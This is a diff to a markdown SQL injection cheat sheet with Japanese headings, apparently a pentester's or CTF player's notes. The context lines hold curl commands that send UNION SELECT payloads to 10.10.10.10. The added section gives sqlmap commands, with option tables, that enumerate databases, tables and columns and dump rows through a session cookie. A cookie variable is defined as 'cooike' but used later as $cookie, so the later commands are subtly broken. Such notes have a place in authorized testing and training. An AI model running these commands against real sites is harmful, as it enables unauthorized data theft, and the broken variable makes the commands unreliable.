@@ -81,3 +81,79 @@ curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+column_name,NULL+FROM+in
 ```zsh
 curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+a_col,NULL+FROM+a_table--+-"
 ```
+
+## sqlmap
+
+### DB の一覧
+
+```zsh
+url="http://$target/..."
+cooike='session=...'
+data='q='
+```
+
+|OPTION         |DESC                                      |
+|---------------|------------------------------------------|
+|-u URL         |Target URL                                |
+|--cookie=COOKIE|HTTP Cookie header value                  |
+|--data=DATA    |Data string to be sent through POST       |
+|--level=LEVEL  |Level of tests to perform (1-5; default 1)|
+|--risk=RISK    |Risk of tests to perform (1-3; default 1) |
+|--dbs          |Enumerate DBMS databases                  |
+
+```zsh
+$ sqlmap -u "$url" --cookie="$cooike" --data="$data" --level 3 --risk 2 --dbs
+```
+
+### 表の一覧
+
+```zsh
+dbms=mysql
+db=...
+```
+
+|OPTION         |DESC                                      |
+|---------------|------------------------------------------|
+|--dbms=DBMS    |Force back-end DBMS to provided value     |
+|-D DB          |DBMS database to enumerate                |
+|--tables       |Enumerate DBMS database tables            |
+
+```zsh
+$ sqlmap -u "$url" --cookie="$cookie" --data="$data" --level 3 --dbms $dbms \
+  -D $db --tables
+```
+
+### 列の一覧
+
+```zsh
+tbl=...
+```
+
+|OPTION   |DESC                                 |
+|---------|-------------------------------------|
+|-u URL   |Target URL                           |
+|-T TBL   |DBMS database table(s) to enumerate  |
+|--columns|Enumerate DBMS database table columns|
+
+```zsh
+$ sqlmap -u "$url" --cookie="$cookie" --data="$data" --level 3 --dbms $dbms \
+  -D $db -T $tbl --columns
+```
+
+### 表の検索
+
+```zsh
+col='COL1,COL2,COL3'
+where='COL1="foo"'
+```
+
+|OPTION|DESC                                          |
+|------|----------------------------------------------|
+|-T    |TBL DBMS database table(s) to enumerate       |
+|-C    |COL DBMS database table column(s) to enumerate|
+|--dump|Dump DBMS database table entries              |
+
+```zsh
+$ sqlmap -u "$url" --cookie="$cookie" --data="$data" --level 3 --dbms $dbms \
+  -D $db -T $tbl -C "$col" --dump --where "$where"
+```
